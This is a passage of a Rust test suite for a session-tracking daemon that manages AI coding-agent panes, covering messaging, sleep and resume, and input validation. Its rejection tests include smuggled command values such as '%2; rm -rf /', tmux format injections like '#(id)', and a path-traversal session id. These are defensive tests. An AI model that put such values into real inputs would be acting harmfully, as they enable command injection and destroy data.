    assert!(recorded && helper_started, "must interrupt actual Claude C-c exit after sleep-recorded");
    assert!(note_retained, "cleanup discarded the resume note while an exit helper survived");
    assert!(paused_delivery.is_null(), "claim admitted while exit helper could still act: {paused_delivery}");
    assert!(paused_send.is_err(), "send admitted while exit helper could still act");
    assert!(root.join("helper-acted").exists());
    if does_helper_exit_agent {
        bench.world.borrow_mut().sender_runtimes.remove(&10);
        let note: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::asleep_dir().join(SESSION_A)).unwrap()).unwrap();
        assert_eq!(sleep_host(&mut bench, "sleep_status", note["team_resume"].as_str()).unwrap()["state"], "prepared");
        for _ in 0..2 { crate::teams::host_snapshot(&mut bench.registry).unwrap(); }
        assert_eq!(started(&bench), vec![vec!["cockpit", "wake", SESSION_A]]);
    } else {
        let resumed_delivery = crate::teams::request(&mut bench.registry, 10, AgentAction::Receive).unwrap().result.unwrap();
        let resumed_send = crate::teams::request(&mut bench.registry, 10, outgoing).and_then(|reply| reply.result);
        assert!(resumed_delivery["dispatch_id"].is_string(), "recorded abandoned operation did not recover: {resumed_delivery}");
        assert!(resumed_send.is_ok(), "{resumed_send:?}");
        assert!(started(&bench).is_empty());
    }
}

#[test]
fn sleep_without_pre_exit_note_acknowledgement_is_cancelled() {
    let mut bench = linked_team_bench();
    let token = prepare_team_sleep(&mut bench);
    // Simulate a caller that died after writing the note but before acknowledging it.
    bench.registry.teams.as_ref().unwrap().execute("UPDATE sleep_permits SET note_recorded=0", []).unwrap();
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    resumed_session_reports(&mut bench, &token);
    crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "cancelled");
    assert!(started(&bench).is_empty());
}

#[test]
fn sleep_preparation_tolerates_an_existing_non_team_note_directory() {
    use std::os::unix::fs::PermissionsExt;
    let mut bench = linked_team_bench();
    let token = sleep_host(&mut bench, "prepare_sleep", None).unwrap()["token"].as_str().unwrap().to_string();
    fs::create_dir_all(cockpit::paths::asleep_dir()).unwrap();
    fs::set_permissions(cockpit::paths::asleep_dir(), fs::Permissions::from_mode(0o755)).unwrap();
    fs::write(cockpit::paths::asleep_dir().join(SESSION_B), json!({"agent":"claude","slept_at":1}).to_string()).unwrap();
    crate::teams::host_snapshot(&mut bench.registry).unwrap();
    assert_eq!(sleep_host(&mut bench, "sleep_status", Some(&token)).unwrap()["state"], "prepared");
    assert_eq!(prepare_team_sleep(&mut bench), token);
}

#[test]
fn the_host_snapshot_lists_verified_sessions() {
    let mut bench = team_bench();
    let snapshot = crate::teams::host(&mut bench.registry, std::process::id(), cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    let sessions = snapshot["sessions"].as_array().unwrap();
    assert_eq!(sessions.len(), 3);
    let row = |id: &str| sessions.iter().find(|row| row["session_id"] == id).unwrap().clone();
    assert_eq!(row(SESSION_A)["project_name"], "project-a");
}

#[test]
fn a_recipient_pulls_one_message_per_observed_turn_state() {
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    send_to_designer(&mut bench, "notice-2");
    let first = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(first["text"].as_str().unwrap().contains("The frame is ready."));
    assert!(!first["dispatch_id"].as_str().unwrap().is_empty());
    let again = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(again.is_null());
}

#[test]
fn only_the_recipient_session_can_acknowledge_its_delivery() {
    use cockpit::teams::{AgentAction, TransportOutcome};
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    let dispatch = crate::teams::request(&mut bench.registry, 10, AgentAction::Receive).unwrap().result.unwrap();
    let receipt = AgentAction::Receipt { dispatch_id: dispatch["dispatch_id"].as_str().unwrap().into(),
        outcome: TransportOutcome::Received { native_id: "native-1".into() } };
    assert!(crate::teams::request(&mut bench.registry, 20, receipt.clone()).and_then(|reply| reply.result).is_err());
    crate::teams::request(&mut bench.registry, 10, receipt).unwrap().result.unwrap();
}

#[test]
fn a_session_waiting_for_theo_is_not_woken_by_collaborators() {
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    bench.registry.sessions.get_mut(SESSION_A).unwrap().needs_input = true;
    let result = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(result.is_null());
}

#[test]
fn different_repositories_with_the_same_directory_name_have_distinct_team_identities() {
    let bench = Bench::new();
    let left = bench.fixture.root.join("left/project");
    let right = bench.fixture.root.join("right/project");
    for (root, remote) in [(&left,"git@github.com:example/one.git"),(&right,"git@github.com:example/two.git")] {
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(root.join(".git/config"), format!("[remote \"origin\"]\n url = {remote}\n")).unwrap();
    }
    assert_ne!(crate::teams::canonical_project(left.to_str().unwrap()).unwrap(),crate::teams::canonical_project(right.to_str().unwrap()).unwrap());
}

#[test]
fn managed_clones_can_share_a_team_without_executing_repository_git_config() {
    let bench = team_bench();
    let primary = bench.fixture.root.join("home/IdeaProjects/project-a");
    let clone = bench.fixture.root.join("home/IdeaProjects/.parallel/project-a/review");
    fs::create_dir_all(clone.join(".git")).unwrap();
    fs::write(clone.join(".git/config"), format!("[remote \"origin\"]\n url = {}\n[core]\n hooksPath = /do-not-execute\n",primary.display())).unwrap();
    assert_eq!(crate::teams::canonical_project(primary.to_str().unwrap()).unwrap(),crate::teams::canonical_project(clone.to_str().unwrap()).unwrap());
    assert!(bench.world.borrow().commands.iter().all(|command| command.first().map(String::as_str) != Some("git")));
}

#[derive(Default)]
struct Shown {
    raised: Vec<String>,
    dropped: Vec<String>,
}

struct FakeBanners(Rc<RefCell<Shown>>);

impl Banners for FakeBanners {
    fn raise_banner(&mut self, banner: &Banner) {
        self.0.borrow_mut().raised.push(banner.session.clone());
    }
    fn raise_notice(&mut self, notice: &Notice) {
        self.0.borrow_mut().raised.push(notice.id.clone());
    }
    fn drop_banner(&mut self, key: &str) {
        self.0.borrow_mut().dropped.push(key.into());
    }
    fn showing(&self, key: &str) -> bool {
        let shown = self.0.borrow();
        shown.raised.iter().any(|raised| raised == key) && !shown.dropped.iter().any(|dropped| dropped == key)
    }
}

/// A registry on a fresh fixture, with handles on what it did.
struct Bench {
    fixture: Fixture,
    world: Rc<RefCell<World>>,
    shown: Rc<RefCell<Shown>>,
    registry: Registry,
    sleep_guards: HashMap<String, fs::File>,
}

impl Bench {
    fn new() -> Self {
        Self::with(Fixture::new(), World::default())
    }

    fn with(fixture: Fixture, world: World) -> Self {
        let world = Rc::new(RefCell::new(world));
        let shown = Rc::new(RefCell::new(Shown::default()));
        let registry = Registry::new(Box::new(FakeSystem(world.clone())), Box::new(FakeBanners(shown.clone())));
        Bench { fixture, world, shown, registry, sleep_guards: HashMap::new() }
    }

    fn report(&mut self, session: &str, fields: Value) {
        let mut report = json!({"session": session, "project": "p"});
        report.as_object_mut().unwrap().extend(fields.as_object().unwrap().clone());
        self.registry.update(parse_session(&report.to_string()).unwrap());
    }

    fn snapshot(&self) -> Vec<Value> {
        let text = fs::read_to_string(cockpit::paths::snapshot()).unwrap();
        serde_json::from_str::<Value>(&text).unwrap()["sessions"].as_array().unwrap().clone()
    }

    fn raised(&self) -> Vec<String> {
        self.shown.borrow().raised.clone()
    }

    fn dropped(&self) -> Vec<String> {
        self.shown.borrow().dropped.clone()
    }

    fn windows(&self) -> Vec<Rc<RefCell<FakeWindow>>> {
        self.world.borrow().windows.clone()
    }

    fn commands(&self) -> Vec<Vec<String>> {
        self.world.borrow().commands.clone()
    }
}

#[test]
fn codex_native_identity_is_retained_for_exact_resume() {
    let mut bench = Bench::new();
    bench.report(CODEX_SESSION, json!({"agent": "codex", "native_thread": SESSION_A, "state": "working", "cwd": "/projects/p"}));
    let rows = bench.snapshot();
    assert_eq!(rows[0]["native_thread"], SESSION_A);
    assert_eq!(rows[0]["agent"], "codex");
    let recent: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::recent_sessions()).unwrap()).unwrap();
    assert_eq!(recent[CODEX_SESSION]["native_thread"], SESSION_A);
}

#[test]
fn codex_cannot_claim_a_claude_id_or_another_native_thread() {
    for (session, agent, native) in [(SESSION_A, "codex", SESSION_A), (CODEX_SESSION, "codex", SESSION_B),
        (CODEX_SESSION, "claude", SESSION_A), (SESSION_A, "claude", SESSION_A)] {
        assert!(parse_session(&json!({"session": session, "project": "p", "agent": agent, "native_thread": native}).to_string()).is_err());
    }
    assert!(parse_session(&json!({"session": CODEX_SESSION, "project": "p", "agent": "codex"}).to_string()).is_err());
}

#[test]
fn codex_native_claims_cannot_rebind_another_live_pane() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(10, BTreeMap::from([("tmux_pane".into(), "%10".into())]));
    bench.world.borrow_mut().sender_targets.insert(20, BTreeMap::from([("tmux_pane".into(), "%20".into())]));
    bench.world.borrow_mut().claude_panes.insert("%10".into());
    let report = parse_session(&json!({"session": CODEX_SESSION, "native_thread": SESSION_A, "agent": "codex", "project": "p", "state": "working"}).to_string()).unwrap();
    bench.registry.report_from(report.clone(), 10).unwrap();
    assert!(bench.registry.report_from(report, 20).is_err());
    assert_eq!(bench.registry.sessions[CODEX_SESSION].target["tmux_pane"], "%10");
}

fn target(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
    pairs.iter().map(|(key, value)| (key.to_string(), value.to_string())).collect()
}

fn set(items: &[&str]) -> HashSet<String> {
    items.iter().map(|item| item.to_string()).collect()
}

// ---- Panes ----

#[test]
fn a_spinner_line_means_working() {
    assert_eq!(pane_state("✻ Spinning… (8m 31s · ↓ 29.7k tokens)\n❯\u{a0}\n"), Some("working"));
}

#[test]
fn the_interrupt_hint_means_working() {
    assert_eq!(pane_state("❯ \n  enter to interrupt and send · ctrl+x then enter to queue\n"), Some("working"));
}

#[test]
fn a_permission_dialog_means_needs_you() {
    assert_eq!(pane_state(" Do you want to proceed?\n ❯ 1. Yes\n   2. No\n"), Some("needs-you"));
}

#[test]
fn a_question_menu_means_needs_you_not_the_idle_prompt() {
    let question = " ☐ Layout\n\n Which guide layout do you want?\n\n ❯ 1. A: one step, one box\n   2. B: checklist + box\n   3. Type something.\n\n Enter to select · ↑/↓ to navigate · Esc to cancel\n";
    assert_eq!(pane_state(question), Some("needs-you"));
}

#[test]
fn a_numbered_line_typed_at_the_prompt_is_not_a_menu() {
    assert_eq!(pane_state("✻ Brewed for 3s\n❯ 1.\n"), Some("waiting"));
}

#[test]
fn the_idle_prompt_with_a_no_break_space_means_waiting() {
    assert_eq!(pane_state("✻ Brewed for 23s · done\n❯\u{a0}\n  [theo@archlinux dotfiles]\n"), Some("waiting"));
}

#[test]
fn phrases_inside_the_conversation_do_not_count() {
    let prose = "- `Do you want to proceed?` on screen: needs-you.\n- esc to interrupt: working.\n❯ \n";
    assert_eq!(pane_state(prose), Some("waiting"));
}

#[test]
fn unrecognised_text_has_no_state() {
    assert_eq!(pane_state("random scrollback\n"), None);
}

#[test]
fn the_permission_request_is_read_from_the_dialog_above_the_question() {
    let boxed = "✻ Thinking…\n╭──────────────────────────╮\n│ Bash command             │\n│                          │\n\
                 │   npm test -- --watch=false │\n│   Run the test suite     │\n│                          │\n\
                 │ Do you want to proceed?  │\n│ ❯ 1. Yes                 │\n│   2. No                  │\n╰──────────╯\n";
    assert_eq!(permission_request(boxed), "Bash command · npm test -- --watch=false");
    assert_eq!(pane_state(boxed), Some("needs-you"));
}

#[test]
fn native_permission_full_request_is_preserved_beyond_the_card_summary() {
    let mut bench = Bench::new();
    let lines: String = (0..35).map(|index| format!("│   command-part-{index}\n")).collect();
    let dialog = format!("unrelated history\n╭─────────────────╮\n│ Bash command\n{lines}│ ENDOFCOMMAND\n│ Do you want to proceed?\n│ ❯ 1. Yes\n╰─────────────────╯\n");
    bench.world.borrow_mut().pane_tails.insert("%5".into(), dialog);
    bench.world.borrow_mut().claude_panes.insert("%5".into());
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Permission needed", "tmux_pane": "%5"}));
    bench.registry.reconcile_with_panes();
    let captured = bench.snapshot().remove(0);
    let complete = captured["full_request"].as_str().expect("complete native dialog missing");
    assert!(complete.contains("command-part-0") && complete.contains("command-part-34"));
    assert!(complete.contains("ENDOFCOMMAND") && !complete.contains("unrelated history"));
    assert!(captured["detail"].as_str().unwrap().chars().count() <= 140);
    let restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    assert_eq!(restored.snapshot_rows()[0]["full_request"], captured["full_request"]);
    bench.report(SESSION_A, json!({"state": "working"}));
    assert_eq!(bench.snapshot()[0]["full_request"], "");
}

#[test]
fn an_unboxed_dialog_gives_the_two_lines_above_it() {
    assert_eq!(permission_request("done\n Edit file\n src/app.ts\n Do you want to proceed?\n ❯ 1. Yes\n"), "done · Edit file");
}

#[test]
fn no_dialog_means_no_request() {
    assert_eq!(permission_request("❯ \n"), "");
}

#[test]
fn a_request_cannot_carry_a_tmux_format() {
    assert!(!permission_request(" Bash\n echo #{pane}\n Do you want to proceed?\n").contains("#{"));
}

// ---- Reports ----

#[test]
fn continuity_results_survive_new_work_and_daemon_reload() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "needs_input": true, "message": "Which provider?", "turn_id": "11111111111111111111111111111111", "turn_complete": true, "outcome": "tests passed", "repository": "acme/shop", "branch": "todo-aabbccdd"}));
    let result = bench.snapshot()[0]["last_result"].clone();
    assert_eq!(result["outcome"], "tests passed");
    assert_eq!(result["repository"], "acme/shop");
    bench.report(SESSION_A, json!({"state": "working", "needs_input": false}));
    assert_eq!(bench.snapshot()[0]["last_result"], result);
    assert_eq!(bench.snapshot()[0]["outcome"], "");
    let restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    assert_eq!(restored.snapshot_rows()[0]["last_result"], result);
}

#[test]
fn continuity_duplicate_completion_preserves_the_first_result_timestamp() {
    let mut bench = Bench::new();
    let report = json!({"state": "waiting", "turn_id": "11111111111111111111111111111111", "turn_complete": true, "outcome": "tests passed"});
    bench.report(SESSION_A, report.clone());
    let first = bench.snapshot()[0]["last_result"].clone();
    assert!(first["completed_at"].as_i64().is_some_and(|time| time > 0));
    bench.report(SESSION_A, report);
    assert_eq!(bench.snapshot()[0]["last_result"], first);
    bench.report(SESSION_A, json!({"state": "waiting", "turn_id": "22222222222222222222222222222222", "turn_complete": true, "outcome": "tests passed"}));
    assert_ne!(bench.snapshot()[0]["last_result"]["id"], first["id"]);
}

#[test]
fn continuity_metadata_cannot_change_authenticated_sender_routing() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    let report = parse_session(&json!({"session": SESSION_A, "project": "other", "state": "working", "tmux_pane": "%1", "repository": "acme/other", "branch": "main"}).to_string()).unwrap();
    bench.registry.report_from(report, 500).unwrap();
    let row = &bench.snapshot()[0];
    assert_eq!(row["tmux_pane"], "%7");
    assert_eq!(row["repository"], "acme/other");
}

#[test]
fn continuity_old_and_malformed_reports_fail_conservatively() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Finished, waiting for you", "outcome": "tests passed"}));
    assert!(bench.snapshot()[0]["last_result"].is_null());
    for fields in [json!({"turn_id": "bad", "turn_complete": true, "outcome": "ok"}), json!({"turn_complete": true, "outcome": "ok"}), json!({"turn_complete": "yes"}), json!({"repository": "acme/other\n"}), json!({"branch": "#{pane}"}), json!({"turn_id": "11111111111111111111111111111111", "turn_complete": true, "outcome": false})] {
        let mut report = json!({"session": SESSION_A, "project": "p", "state": "waiting"});
        report.as_object_mut().unwrap().extend(fields.as_object().unwrap().clone());
        assert!(parse_session(&report.to_string()).is_err(), "accepted invalid metadata: {fields}");
    }
}

#[test]
fn continuity_a_session_whose_hook_reports_repositories_is_marked_as_reporting_turns() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting"}));
    assert_eq!(bench.snapshot()[0]["reports_turns"], false, "an old hook never sends repository");
    bench.report(SESSION_A, json!({"state": "waiting", "repository": "", "branch": ""}));
    assert_eq!(bench.snapshot()[0]["reports_turns"], true);
    bench.report(SESSION_A, json!({"state": "working"}));
    assert_eq!(bench.snapshot()[0]["reports_turns"], true);
    let restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    assert_eq!(restored.snapshot_rows()[0]["reports_turns"], true);
}

#[test]
fn continuity_completion_without_an_outcome_does_not_fabricate_a_result() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "turn_id": "11111111111111111111111111111111", "turn_complete": true}));
    assert!(bench.snapshot()[0]["last_result"].is_null());
}

#[test]
fn label_updates_publish_without_changing_activity_or_pending_questions() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "task": "Original user request", "message": "Which option?", "needs_input": true, "sticky": true}));
    let before = bench.snapshot().remove(0);
    let dropped = bench.dropped();
    bench.report(SESSION_A, json!({"label": "Fix session navigation"}));
    let after = bench.snapshot().remove(0);
    assert_eq!(after["label"], "Fix session navigation");
    for key in ["state", "since", "task", "request", "needs_input"] {
        assert_eq!(after[key], before[key], "metadata changed {key}");
    }
    assert_eq!(bench.dropped(), dropped, "label metadata must not dismiss a question banner");
}

#[test]
fn background_updates_preserve_pending_question_banners() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Allow this command?", "sticky": true, "background": 1}));
    let dropped = bench.dropped();
    bench.report(SESSION_A, json!({"agents": 0, "background": 0}));
    assert_eq!(bench.snapshot()[0]["state"], "needs-you");
    assert_eq!(bench.snapshot()[0]["background"], 0);
    assert_eq!(bench.dropped(), dropped, "background completion must not dismiss a question banner");
}

#[test]
fn labels_survive_reports_without_labels_and_daemon_restarts() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "label": "Free disk space"}));
    bench.report(SESSION_A, json!({"state": "waiting"}));
    assert_eq!(bench.snapshot()[0]["label"], "Free disk space");
    let restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    assert_eq!(restored.snapshot_rows()[0]["label"], "Free disk space");
}

#[test]
fn label_reports_reject_malformed_or_unsafe_names() {
    for label in [json!(false), json!(null), json!(""), json!("Two words"), json!("one two three four five six seven"),
                  json!("a".repeat(57) + " b c"), json!("Free\ndisk space"), json!("Free\u{1b} disk space"), json!("Read #(id) output"), json!("Read #{pane} output")] {
        assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "label": label}).to_string()).is_err(), "accepted {label}");
    }
}

#[test]
fn labels_are_normalized_before_they_are_published() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"label": "  Free   disk space  "}));
    assert_eq!(bench.snapshot()[0]["label"], "Free disk space");
}

#[test]
fn label_reports_cannot_rename_another_panes_session() {
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.sender_targets.insert(500, target(&[("tmux_pane", "%1")]));
        world.sender_targets.insert(600, target(&[("tmux_pane", "%9")]));
        world.claude_panes = set(&["%1", "%9"]);
    }
    let report = |label| parse_session(&json!({"session": SESSION_A, "project": "p", "label": label}).to_string()).unwrap();
    bench.registry.report_from(report("Fix session navigation"), 500).unwrap();
    assert!(bench.registry.report_from(report("Replace another task"), 600).is_err());
    assert_eq!(bench.snapshot()[0]["label"], "Fix session navigation");
}

#[test]
fn a_full_report_is_accepted() {
    let report = parse_session(&json!({"session": SESSION_A, "state": "working", "project": "p", "tmux_pane": "%4",
                                       "kitty_pid": "42", "kitty_listen": "unix:@kitty-42"}).to_string()).unwrap();
    assert_eq!(report.target["tmux_pane"], "%4");
    assert!(!report.sticky);
}

#[test]
fn the_state_is_optional() {
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "message": "info"}).to_string()).unwrap();
    assert_eq!(report.state, None);
}

#[test]
fn injections_in_focus_fields_are_refused() {
    for bad in [json!({"tmux_pane": "%2; rm -rf /"}), json!({"kitty_pid": "12\") os.exit"}), json!({"kitty_listen": "unix:@a b"})] {
        let mut report = json!({"session": SESSION_A, "project": "p"});
        report.as_object_mut().unwrap().extend(bad.as_object().unwrap().clone());
        assert!(parse_session(&report.to_string()).is_err(), "{bad}");
    }
}

#[test]
fn an_opencode_session_id_is_accepted_with_its_agent() {
    let report = parse_session(&json!({"session": OPENCODE_SESSION, "project": "p", "agent": "opencode"}).to_string()).unwrap();
    assert_eq!(report.agent.as_deref(), Some("opencode"));
}

#[test]
fn an_unknown_agent_or_a_malformed_id_is_refused() {
    for bad in [json!({"session": SESSION_A, "agent": "codex"}), json!({"session": SESSION_A, "agent": true}),
                json!({"session": "ses_a b"}), json!({"session": "ses_x"}), json!({"session": "../ses_3f2a9c0b1ffeQkTz"})] {
        let mut report = json!({"project": "p"});
        report.as_object_mut().unwrap().extend(bad.as_object().unwrap().clone());
        assert!(parse_session(&report.to_string()).is_err(), "{bad}");
    }
}

#[test]
fn an_unknown_state_is_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "state": "bogus", "project": "p"}).to_string()).is_err());
}

#[test]
fn a_missing_project_is_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "state": "working"}).to_string()).is_err());
}

#[test]
fn tmux_formats_in_text_are_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "task": "#(id)"}).to_string()).is_err());
}

#[test]
fn notices_are_validated_like_session_text() {
    let notice = parse_notice(&json!({"id": "claude-usage-80", "title": "Claude · This week at 82%", "message": "Resets Sat"}).to_string()).unwrap();
    assert_eq!(notice.id, "claude-usage-80");
    let bad = ["nope".to_string(), "[]".to_string(), json!({"id": "A B", "title": "t", "message": "m"}).to_string(),
               json!({"id": "x", "title": "", "message": "m"}).to_string(), json!({"id": "x", "title": "#{pane}", "message": "m"}).to_string()];
    for raw in bad {
        assert!(parse_notice(&raw).is_err(), "{raw}");
    }
}

// ---- Outside the registry ----

#[test]
fn only_a_timed_event_under_way_is_a_meeting() {
    use chrono::{Local, TimeZone};
    let now = Local.with_ymd_and_hms(2026, 10, 19, 10, 30, 0).single().unwrap().timestamp() as f64;
    assert!(events_now("Today, 19/10/2026\n19/10/2026 10:00|19/10/2026 11:00|Standup\n", now));
    assert!(!events_now("19/10/2026|20/10/2026|Holiday\n", now));
    assert!(!events_now("19/10/2026 09:00|19/10/2026 10:30|Done\n", now));
    assert!(events_now("19/10/2026 10:31|19/10/2026 11:00|Starts now\n", now));
}

#[test]
fn gaming_means_game_mode_or_a_game_window() {
    assert!(is_game("gamemode", "kitty"));
    assert!(is_game("default", "steam_app_1245620"));
    assert!(!is_game("default", "zen"));
}

#[test]
fn hyprctl_gets_the_running_hyprland_when_its_id_is_stale() {
    let fixture = Fixture::new();
    let folder = fixture.root.join("run/hypr/running_instance");
    fs::create_dir_all(&folder).unwrap();
    fs::write(folder.join(".socket.sock"), "").unwrap();
    // SAFETY: the fixture holds the environment lock.
    unsafe { std::env::set_var("HYPRLAND_INSTANCE_SIGNATURE", "gone") };
    cockpit::util::refresh_hyprland_instance();
    assert_eq!(std::env::var("HYPRLAND_INSTANCE_SIGNATURE").unwrap(), "running_instance");
}

#[test]
fn a_parallel_clone_is_named_after_its_repository() {
    let _fixture = Fixture::new();
    let clones = cockpit::paths::clones_dir();
    assert_eq!(parallel_clone_repository(&clones.join("opusline/feat-x").to_string_lossy()), "opusline");
    assert_eq!(parallel_clone_repository(&clones.join("opusline/pr-12/apps").to_string_lossy()), "opusline");
    assert_eq!(parallel_clone_repository("/home/theo/IdeaProjects/opusline"), "");
    assert_eq!(parallel_clone_repository(&clones.to_string_lossy()), "");
}

struct ProcessTree(BTreeMap<String, (String, Vec<String>, HashMap<String, String>)>);

impl Processes for ProcessTree {
    fn pids(&self) -> Vec<String> { self.0.keys().cloned().collect() }
    fn comm(&self, pid: &str) -> String { self.0[pid].0.clone() }
    fn command(&self, pid: &str) -> Vec<String> { self.0[pid].1.clone() }
    fn environment(&self, pid: &str) -> HashMap<String, String> { self.0[pid].2.clone() }
    fn pid_namespace(&self, _: &str) -> Option<String> { Some("host".into()) }
}

#[test]
fn floating_chat_ownership_binds_the_conversation_pane_and_tmux_server() {
    for (agent, flag, session) in [("claude", "--session-id", SESSION_A), ("opencode", "--session", OPENCODE_SESSION)] {
        let tree = ProcessTree(BTreeMap::from([("10".into(), (agent.into(),
            vec![agent.into(), flag.into(), session.into()],
            environment(&[("TMUX_PANE", "%4"), ("TMUX", "/tmp/fixture-tmux,123,0")])))]));
        assert!(session_owns_pane_in(&tree, session, "%4", "123"));
        assert!(!session_owns_pane_in(&tree, SESSION_B, "%4", "123"), "another conversation must not claim the pane");
        assert!(!session_owns_pane_in(&tree, session, "%5", "123"), "another pane must not be accepted");
        assert!(!session_owns_pane_in(&tree, session, "%4", "999"), "an orphan from an old tmux server must not claim a reused pane ID");
    }
}

#[test]
fn floating_chat_ownership_does_not_accept_a_shell_or_overrule_an_explicit_session_id() {
    let mut tree = ProcessTree(BTreeMap::from([("10".into(), ("bash".into(),
        vec!["bash".into()], environment(&[("TMUX_PANE", "%4"), ("TMUX", "/tmp/fixture-tmux,123,0"), ("CLAUDE_CODE_SESSION_ID", SESSION_A)])))]));
    assert!(!session_owns_pane_in(&tree, SESSION_A, "%4", "123"));
    tree.0.get_mut("10").unwrap().0 = "opencode".into();
    assert!(session_owns_pane_in(&tree, SESSION_A, "%4", "123"));
    tree.0.get_mut("10").unwrap().1 = vec!["opencode".into(), "--session".into(), OPENCODE_SESSION.into()];
    assert!(!session_owns_pane_in(&tree, SESSION_A, "%4", "123"));
}

#[test]
fn floating_chat_ownership_uses_the_current_id_not_the_conversation_resumed_from() {
    let tree = ProcessTree(BTreeMap::from([("10".into(), ("claude".into(),
        vec!["claude".into(), "--resume".into(), SESSION_B.into(), "--session-id".into(), SESSION_A.into()],
        environment(&[("TMUX_PANE", "%4"), ("TMUX", "/tmp/fixture-tmux,123,0")])))]));
    assert!(session_owns_pane_in(&tree, SESSION_A, "%4", "123"));
    assert!(!session_owns_pane_in(&tree, SESSION_B, "%4", "123"));
}

#[test]
fn the_session_tree_of_claude_2_1_300_is_read_right() {
    // Launcher, daemon (same environment, outlives the launcher), pty host, spare, the session
    // binary, and a shell whose command line mentions an id.
    let pane = |id: &str| HashMap::from([("TMUX_PANE".to_string(), id.to_string())]);
    let words = |parts: &[&str]| parts.iter().map(|part| part.to_string()).collect::<Vec<_>>();
    let mut tree = ProcessTree(BTreeMap::from([
        ("10".into(), ("claude".into(), words(&["/home/t/.local/bin/claude", "--resume", SESSION_B]), pane("%12"))),
        ("11".into(), ("claude".into(), words(&["/home/t/.local/bin/claude", "daemon", "run", "--origin", "transient"]), pane("%12"))),
        ("12".into(), ("2.1.300".into(), words(&["claude bg-pty-host", "--bg-pty-host", "/tmp/x.sock"]), HashMap::new())),
        ("13".into(), ("2.1.300".into(), words(&["claude bg-spare", "--bg-spare", "/tmp/y.sock"]), HashMap::new())),
        ("14".into(), ("2.1.300".into(), words(&["/home/t/.local/share/claude/versions/2.1.300", "--session-id", SESSION_A, "--fork-session"]), HashMap::new())),
        ("15".into(), ("bash".into(), words(&["bash", "-c", &format!("echo --session-id {SESSION_B}")]), pane("%12"))),
    ]));
    assert_eq!(claude_processes(&tree), ["10", "14"]);
    assert_eq!(live_session_ids_in(&tree), set(&[SESSION_A]));
    assert_eq!(claude_panes_in(&tree), set(&["%12"]), "the launcher's pane, not the daemon's");
    tree.0.remove("10");
    assert_eq!(claude_panes_in(&tree), set(&[]));
}

#[test]
fn an_opencode_process_keeps_its_pane_alive() {
    let pane = HashMap::from([("TMUX_PANE".to_string(), "%21".to_string())]);
    let tree = ProcessTree(BTreeMap::from([
        ("30".into(), ("opencode".into(), vec!["/home/t/.opencode/bin/opencode".into()], pane)),
    ]));
    assert_eq!(claude_panes_in(&tree), set(&["%21"]));
}

// ---- The registry ----

#[test]
fn fixture_state_does_not_escape_into_an_inherited_host_state_folder() {
    let outside = std::env::temp_dir().join(format!("osd-host-state-{}", cockpit::util::token_hex(6)));
    fs::create_dir(&outside).unwrap();
    let result = std::process::Command::new(std::env::current_exe().unwrap())
        .args(["--exact", "tests::sessions_are_remembered_across_reboots"])
        .env("COCKPIT_STATE_HOME", &outside).output().unwrap();
    let leaked = fs::read_dir(&outside).unwrap().next().is_some();
    fs::remove_dir_all(&outside).unwrap();
    assert!(result.status.success(), "{}", String::from_utf8_lossy(&result.stdout));
    assert!(!leaked, "the fixture wrote into the inherited host state folder");
}

#[test]
fn an_explicit_question_survives_idle_and_working_pane_reconciliation() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true, "tmux_pane": "%5"}));
    for tail in ["❯ \n", "✻ Flowing… (2s)\n"] {
        bench.world.borrow_mut().pane_tails.insert("%5".into(), tail.into());
        bench.registry.reconcile_with_panes();
        assert_eq!(bench.snapshot()[0]["state"], "needs-you");
        assert_eq!(bench.snapshot()[0]["request"], "Which option?");
    }
}

#[test]
fn a_prompt_releases_explicit_question_protection() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true, "tmux_pane": "%5"}));
    bench.report(SESSION_A, json!({"state": "working", "needs_input": false}));
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "❯ \n".into());
    bench.registry.reconcile_with_panes();
